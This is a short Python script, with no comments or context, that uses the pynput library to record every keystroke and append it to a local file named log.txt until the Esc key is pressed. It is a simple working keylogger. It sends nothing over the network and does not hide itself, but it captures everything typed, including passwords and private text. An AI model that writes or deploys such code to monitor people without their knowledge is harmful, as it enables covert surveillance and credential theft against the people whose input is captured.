from pynput.keyboard import Key, Listener
keys = []

def on_press(key):
  keys.append(key)

def write():
  with open("log.txt", "a") as fp:
    for item in keys:
      temp = str(item).replace("'", '')
      fp.write(temp)
      fp.write("\n")

def on_release(key):
  if key == Key.esc:
    write()
    return False

with Listener(on_press = on_press, on_release = on_release) as l:
  l.join()